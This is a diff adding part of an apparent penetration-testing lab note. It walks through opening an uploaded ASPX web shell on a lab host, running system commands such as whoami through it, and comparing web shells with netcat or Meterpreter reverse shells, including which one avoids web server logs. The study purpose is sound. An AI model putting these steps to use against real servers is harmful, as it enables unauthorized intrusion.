+1. **Upload Execution:** The application saves the file under `files/demo.aspx`.
+
+![[Pasted image 20260812191601.png]]
+
+2. **Accessing the Shell:** Navigate to the uploaded script via your web browser:
+   `http://status.inlanefreight.local//files/demo.aspx`
+
+![[Pasted image 20260812191616.png]]
+
+3. **Executing Commands:** Enter system commands (e.g., `systeminfo`, `whoami`, `ipconfig`) directly within the browser interface.
+
+![[Pasted image 20260812191803.png]]
+
+## 4. Web Shell vs. Interactive Reverse Shell
+
+|**Metric**|**Web Shell (Browser-Based)**|**Interactive Reverse Shell (nc / Meterpreter)**|
+|---|---|---|
+|**Protocol**|HTTP / HTTPS (Stateless Request/Response)|Raw TCP / Encrypted Socket Stream|
+|**Interactive Commands**|No (`su`, `sudo`, `ssh`, or interactive prompts fail)|Full support for job control and TTY interfaces|
+|**Persistence**|Low (Subject to web server file cleanup scripts)|Medium-High (Can spawn backgrounded system daemons)|
+|**Network Footprint**|Logged in HTTP access logs (`access.log`)|Raw socket traffic; bypasses web server logging|
+
+---
